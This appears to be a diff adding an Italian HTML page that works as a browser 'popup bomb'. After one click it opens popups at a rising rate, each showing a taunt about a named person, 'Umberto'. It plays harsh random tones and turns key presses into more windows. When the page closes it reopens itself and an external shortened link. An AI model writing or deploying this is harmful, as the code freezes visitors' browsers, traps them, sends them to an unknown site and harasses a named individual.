@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💀 ti sto per distruggere 💀</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #f00;
+            font-family: 'Arial Black', sans-serif;
+            text-align: center;
+            overflow: hidden;
+            cursor: none;
+        }
+        #startButton {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 40px 80px;
+            font-size: 48px;
+            background: linear-gradient(45deg, #f00, #800);
+            color: #000;
+            border: 10px solid #fff;
+            border-radius: 0;
+            cursor: pointer;
+            z-index: 1000;
+            animation: pulse 0.1s infinite alternate, shake 0.1s infinite;
+            text-shadow: 0 0 10px #fff;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 20px #f00; }
+            100% { box-shadow: 0 0 100px #f00, 0 0 60px #fff, 0 0 30px #ff0; }
+        }
+        @keyframes shake {
+            0% { transform: translate(-50%, -50%) rotate(-1deg); }
+            100% { transform: translate(-50%, -50%) rotate(1deg); }
+        }
+        #warning {
+            position: fixed;
+            bottom: 20px;
+            width: 100%;
+            font-size: 32px;
+            color: #f00;
+            text-shadow: 0 0 10px #fff;
+            animation: blink 0.5s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        .explosion {
+            position: fixed;
+            font-size: 150px;
+            animation: explode 0.5s forwards;
+            z-index: 999;
+            pointer-events: none;
+        }
+        @keyframes explode {
+            0% { transform: scale(0.1); opacity: 1; }
+            100% { transform: scale(5); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <button id="startButton" onclick="startNuclearWar()">☢️ ATTIVA L'ESTINZIONE ☢️</button>
+    <div id="warning">⚠️ AVVISO: QUESTO DISTRUGGERÀ IL TUO BROWSER ⚠️</div>
+
+    <script>
+        let speed = 1; // 1000 popup al secondo iniziali
+        let isRunning = false;
+        let popupCount = 0;
+        let explosions = ['💥', '☢️', '💀', '🔥', '👾', '🤯', '👹', '🌋'];
+        let audioCtx;
+        
+        function startNuclearWar() {
+            if (isRunning) return;
+            isRunning = true;
+            
+            // Rimuovi il pulsante
+            document.getElementById('startButton').remove();
+            document.getElementById('warning').innerHTML = 
+                '💥 <span style="font-size:48px">SISTEMA IN COLLASSO</span> 💥<br>' +
+                `POPUP: <span id="counter">0</span> - VELOCITÀ: <span id="speed">1000/s</span>`;
+            
+            // Avvia effetti sonori distruttivi
+            startAudioTerror();
+            
+            // Avvia pioggia di esplosioni
+            setInterval(createExplosion, 50);
+            
+            // Funzione di bombardamento nucleare
+            function nuclearHolocaust() {
+                popupCount += 10; // Incrementa più velocemente
+                document.getElementById('counter').textContent = popupCount;
+                document.getElementById('speed').textContent = Math.floor(1000/speed) + "/s";
+                
+                // Crea raffica di popup
+                for (let i = 0; i < 10; i++) {
+                    setTimeout(() => {
+                        try {
+                            let win = window.open('', '_blank', `width=${Math.random()*300+100},height=${Math.random()*300+100}`);
+                            if (win) {
+                                win.document.write(`
+                                    <body style="background:#000;color:#f00;text-align:center;padding-top:${Math.random()*100}px">
+                                        <h1 style="font-size:${Math.random()*30+20}px">UMBERTO È NERO</h1>
+                                        <button onclick="window.close()" style="padding:10px;background:#f00;color:#000;border:none;cursor:pointer;font-size:${Math.random()*20+10}px">
+                                            ${Math.random() > 0.5 ? 'OK' : 'CHIUDI'}
+                                        </button>
+                                        <script>setTimeout(function(){ window.close(); }, ${Math.random()*2000+1000})<\/script>
+                                    </body>
+                                `);
+                            }
+                        } catch(e) {}
+                    }, i * speed);
+                }
+                
+                // Aumenta progressivamente la velocità
+                speed = Math.max(0.1, speed * 0.95);
+            }
+            
+            // Avvia l'olocausto
+            let attackInterval = setInterval(nuclearHolocaust, speed);
+            
+            // Blocca la chiusura della pagina in modo sadico
+            window.onbeforeunload = function(e) {
+                for (let i = 0; i < 20; i++) {
+                    setTimeout(() => {
+                        try {
+                            window.open(location.href, '_blank');
+                            window.open('https://is.gd/YMMYGQ', '_blank');
+                        } catch(e) {}
+                    }, i * 100);
+                }
+                return "NO, NON PUOI SCAPPARE!";
+            };
+            
+            // Disabilita tutti i tasti
+            document.onkeydown = function(e) {
+                e.preventDefault();
+                for (let i = 0; i < 5; i++) {
+                    setTimeout(() => {
+                        try {
+                            window.open('', '_blank');
+                        } catch(e) {}
+                    }, i * 50);
+                }
+                return false;
+            };
+        }
+        
+        function createExplosion() {
+            let boom = document.createElement('div');
+            boom.className = 'explosion';
+            boom.textContent = explosions[Math.floor(Math.random() * explosions.length)];
+            boom.style.left = Math.random() * 100 + 'vw';
+            boom.style.top = Math.random() * 100 + 'vh';
+            boom.style.color = `rgb(255, ${Math.floor(Math.random()*100)}, 0)`;
+            document.body.appendChild(boom);
+            
+            setTimeout(() => {
+                boom.remove();
+            }, 500);
+        }
+        
+        function startAudioTerror() {
+            try {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                setInterval(() => {
+                    let oscillator = audioCtx.createOscillator();
+                    let gainNode = audioCtx.createGain();
+                    oscillator.connect(gainNode);
+                    gainNode.connect(audioCtx.destination);
+                    
+                    oscillator.type = ['sine', 'square', 'sawtooth', 'triangle'][Math.floor(Math.random()*4)];
+                    oscillator.frequency.value = Math.random() * 2000 + 100;
+                    gainNode.gain.value = Math.random() * 0.5;
+                    
+                    oscillator.start();
+                    oscillator.stop(audioCtx.currentTime + 0.1);
+                }, 50);
+            } catch(e) {}
+        }
+    </script>
+</body>
+</html>
